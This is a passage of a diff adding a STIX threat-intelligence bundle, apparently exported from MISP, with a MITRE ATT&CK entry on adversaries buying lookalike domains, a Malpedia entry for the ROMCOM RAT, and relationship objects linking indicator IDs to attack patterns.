+            "description": "ATT&CK Tactic | Adversaries may purchase domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries can use purchased domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries can also use internationalized domain names (IDNs) to create visually similar lookalike domains for use in operations.(Citation: CISA IDN ST05-016)\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "mitre-attack-pattern"
+                }
+            ],
+            "labels": [
+                "misp:galaxy-name=\"Attack Pattern\"",
+                "misp:galaxy-type=\"mitre-attack-pattern\"",
+                "misp-galaxy:mitre-attack-pattern=\"Domains - T1583.001\""
+            ],
+            "external_references": [
+                {
+                    "source_name": "capec",
+                    "external_id": "CAPEC-630"
+                }
+            ]
+        },
+        {
+            "type": "malware",
+            "id": "malware--7b7c3631-2f5a-484d-ae0d-d701cc94b858",
+            "created": "2022-11-03T15:25:52.000Z",
+            "modified": "2022-11-03T15:25:52.000Z",
+            "name": "ROMCOM RAT",
+            "description": "Malware galaxy based on Malpedia archive. | The ROMCOM RAT is a threatening backdoor that is being used by threat developers named Tropical Scorpius, which is related to the Cuba Ransomware, also known as COLDDRAW.\r\n\r\n",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "malpedia"
+                }
+            ],
+            "labels": [
+                "misp:galaxy-name=\"Malpedia\"",
+                "misp:galaxy-type=\"malpedia\"",
+                "misp-galaxy:malpedia=\"7b7c3631-2f5a-484d-ae0d-d701cc94b858\""
+            ]
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--8dcb5cf0-bea0-4775-904d-599a34da1fcc",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--b843903a-afc2-4e3b-9bc9-c187d66d01e8",
+            "target_ref": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--742fe24b-c168-45b6-b402-7cc2cd4fe70e",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--b843903a-afc2-4e3b-9bc9-c187d66d01e8",
+            "target_ref": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--6daf478b-4921-48a5-8605-624e1a598b9b",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--b843903a-afc2-4e3b-9bc9-c187d66d01e8",
+            "target_ref": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--ec918a16-09a8-4eaa-9025-29f403d72649",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--b843903a-afc2-4e3b-9bc9-c187d66d01e8",
+            "target_ref": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--bda79ab2-7b58-488a-be16-d689886085bd",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--b843903a-afc2-4e3b-9bc9-c187d66d01e8",
+            "target_ref": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--b82b8f28-83fe-41bb-9012-74022d7aa9e8",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--3b5ebf52-304d-4c4d-84af-f7aff300a1fc",
+            "target_ref": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--7572d940-0756-435b-b77b-dff21d8b3013",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--eaf205f3-dff8-4471-8b0e-fc4ae30384db",
+            "target_ref": "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a7618fde-b486-4fc3-826d-fd8ed7102313",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--eaf205f3-dff8-4471-8b0e-fc4ae30384db",
+            "target_ref": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--6f65e55f-40c7-41a1-9202-5c125452ba98",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--eaf205f3-dff8-4471-8b0e-fc4ae30384db",
+            "target_ref": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--ab3f32de-2cff-4e0f-9190-44e798f2964b",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--eaf205f3-dff8-4471-8b0e-fc4ae30384db",
+            "target_ref": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--c024a48d-38fc-47e5-b256-3f79abec98cc",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--eaf205f3-dff8-4471-8b0e-fc4ae30384db",
+            "target_ref": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--c514bddf-831a-4c30-8ab7-607167141c19",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--eaf205f3-dff8-4471-8b0e-fc4ae30384db",
+            "target_ref": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--de47f49b-2f71-4c64-9ad3-b735d7fb2087",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "relationship_type": "indicates",
+            "source_ref": "indicator--eaf205f3-dff8-4471-8b0e-fc4ae30384db",
+            "target_ref": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5"
+        },
+        {
+            "type": "marking-definition",
+            "id": "marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da",
+            "created": "2017-01-20T00:00:00.000Z",
+            "definition_type": "tlp",
+            "definition": {
+                "tlp": "green"
+            }
+        }
+    ]
+}
